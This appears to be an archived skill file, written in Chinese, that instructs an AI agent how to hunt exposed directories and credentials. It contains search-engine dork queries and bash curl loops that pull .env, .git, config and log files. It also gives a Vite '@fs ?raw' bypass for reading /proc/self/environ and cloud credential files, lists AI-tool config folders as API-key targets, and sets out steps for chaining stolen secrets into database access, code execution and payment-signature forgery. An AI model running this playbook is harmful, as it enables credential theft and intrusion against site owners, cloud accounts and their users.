<!-- archived from /root/.hermes/skills/security/sensitive-dir-credential-hunt/SKILL.md on 2026-10-21 -->

---
name: sensitive-dir-credential-hunt
description: "开放目录/敏感文件猎取时使用。触发: Index of, 目录遍历面, .env泄露, .git泄露, 凭证淘金。"
version: 1.0.0
license: MIT
author: hermes-curator
metadata:
  hermes:
    tags: [pentest, recon, directory-listing, env, git, credentials, surveyengine-absorbed]
    related_skills: [path-traversal-pentest, heapdump-credential-hunter, userdata-grab, surveyengine-knowledge-pack]
---

> 归档卡：原目录 `/root/.hermes/skills/security/sensitive-dir-credential-hunt`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/sensitive-dir-credential-hunt/…')`，不要相对 `references/legacy/` 解析。

# 敏感目录与凭证猎取(开放目录/空间引擎定向)

## When to Use

遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。


来源: 测绘引擎知识包吸收(镜像 `.cursor\skills\sensitive-dir-dump\SKILL.md` + playbooks `docs/playbooks/敏感目录与日志泄露手法.md`)。

**铁律**: 空间引擎搜索必须带 `domain="授权域"`/品牌词,禁止无域全网扫;只动授权目标。

## 1. 猎取对象清单
| 类别 | 目标 |
|---|---|
| 目录列表 | `Index of /`、Directory listing、href 标签 |
| 源码/配置 | `.env`、`.git/config`、`.svn`、`composer.json`、`wp-config.php`、`config.php` |
| 密钥/凭据 | `.ssh/`、`.aws/`、`.claude/`、`.cursor/`、`.codex/`、`tfstate`、`kubeconfig`、`docker-compose.yml`、`id_rsa` |
| 日志/堆 | `storage/logs/laravel.log`、`*.hprof`/heapdump(→ heapdump-credential-hunter)、`*.log` |
| AI 工具面 | `.hermes/`、`.openclaw/`(AI agent 配置常含 API key) |
| 备份 | `*.bak`、`*.zip`、`*.tar.gz`、`backup/`、`www.zip` |

## 2. 空间引擎定向查询(Fofa/Shodan/Censys)
```
# Fofa(带域约束)
domain="target.com" && title="Index of /"
domain="target.com" && (body=".env" || body="laravel.log")
domain="target.com" && body="kubeconfig" || body="tfstate"
cert="target.com" && (body="index of" || body="Directory listing")

# Shodan(网页版不耗 credits)
http.title:"Index of" hostname:target.com
http.html:".env" hostname:target.com

# Censys(新平台语法)
host.services.endpoints.http.html_title:"Index of" and host.services.endpoints.http.html_body:".env"
```
Wayback: `curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=json&filter=statuscode:200&collapse=urlkey"` 找历史暴露。

## 3. 直测 URL(站点内)
```bash
# 目录列表探测
for p in / /backup/ /data/ /uploads/ /files/ /logs/ /tmp/ /old/ /test/ /admin/; do
  code=$(curl -s -o /tmp/r -w "%{http_code}" "https://target$p")
  grep -qiE "index of|directory listing|<title>.*/</title>" /tmp/r && echo "LISTING: $p ($code)"
done

# 敏感文件直读
for f in .env .git/config .svn/entries composer.json storage/logs/laravel.log \
         wp-config.php config.php application.yml docker-compose.yml; do
  code=$(curl -s -o /tmp/r -w "%{http_code}" "https://target/$f")
  [ "$code" = "200" ] && echo "HIT: /$f ($(wc -c < /tmp/r)B)" && head -c 200 /tmp/r
done
```

## 3b. 前端开发服务器(dev server)泄露 .env/云凭据 — Vite CVE-2026-39364(2026-09 大规模在野扫描)
- 面: 5173(Vite 默认)/3000/8080/8888 等 **dev server 被 `--host` / 容器端口映射 / K8s ingress / 安全组误开放**;指纹 `@vite/client`、`<script type="module" src="/src/main.ts">`、`/@fs/` 可达
- 洞: `/@fs/` 本应受 `server.fs.deny` 约束,加 **`?raw` / `?import&raw` / `?import&url&inline`** 即绕过并返回 HTTP 200;影响 **Vite 7.1.0–7.3.1 / 8.0.0–8.0.4**;配合**双编码 `%252f`**(反代与后端解码次数不同)穿 WAF/网关
- 可直接抄的取数清单(比裸 `.env` 命中率高):`.env` 系(`.env.local/.production/.staging`)、`.aws/credentials`(遍历 `/root` `/home/ec2-user` `/home/ubuntu` `/home/node` `/home/www-data` `/home/admin` `/home/debian` `/var/www` `/usr/src/app` `/app`)、`.aws/config`、`.aws/credentials.bak`、`.aws/sso/cache/`、`rootkey.csv`、`aws-exports.js`、`amplifyconfiguration.json`、`.azure/credentials`、`.azure/accessTokens.json`、`terraform.tfstate`/`*.tfvars`、serverless state
- **免猜安装路径**:`/@fs//proc/self/cwd/.env`(进程工作目录)、`/@fs//proc/self/environ`(整个环境变量)→ 往往一条就够
- 类级迁移: 该家族反复出洞(Vite CVE-2025-30208 / 31125 / 2024-45811 已入 KEV;Next.js 中间件绕过 CVE-2025-29927 常被同一批扫描器齐打)→ **见到 framework dev server(webpack-dev-server / Vite / Next dev / Astro / Nuxt)就试 `@fs`・`?raw`・`?import` 组合 + 编码变形**,命中后按 §4 走凭据链
- 来源: https://www.f5.com/labs/articles/cloud-takeover-mass-scanning-for-exposed-vite-endpoints-cve-2026-39364 | https://www.bleepingcomputer.com/news/security/hackers-target-exposed-vite-dev-servers-to-steal-aws-azure-secrets/ | https://cybersecuritynews.com/vite-servers-under-attack/

## 4. 命中后处理
| 命中 | 下一步 |
|---|---|
| `.env` | APP_KEY/DB 凭据 → CVE-2018-15133 / 连库;Laravel 走 laravel-app-pentest |
| `storage/logs/laravel.log` | 抽 `merchant_pem`/支付 key → callback-signature-forgery(F-01 先于支付栈) |
| `.git/config` | git 泄露: GitHacker / `python3 githacker --url https://target/.git/ --folder /tmp/git` → 源码 |
| heapdump | **heapdump-credential-hunter**(正则+对象图,禁止只 strings) |
| composer.json | 认栈(PHP 框架/发卡);拿版本 → 对应框架技能 |
| 云配置 | tfstate/kubeconfig → cloud-aws 等云技能 |

## 成功口径
| 档 | 条件 |
|---|---|
| L1 | 开放目录 `Index of /` 确认(空 403 不算) |
| L2 | 拿到口令/key 片段/SSH whoami |
| L3 | 凭据链打通(连库/登录/签名伪造) |

## Pitfalls
- 空 403 ≠ 漏洞(可能 deny);只有真 listing/href 才算 L1
- 禁止无 domain 的全网扫(用户红线);空间引擎带域约束
- 目录猎杀 ≠ 主机后渗透 LSASS;路径穿越走 path-traversal-pentest
- .env 直读 404 是常态(nginx deny),靠 Whoops 异常页/日志兜底
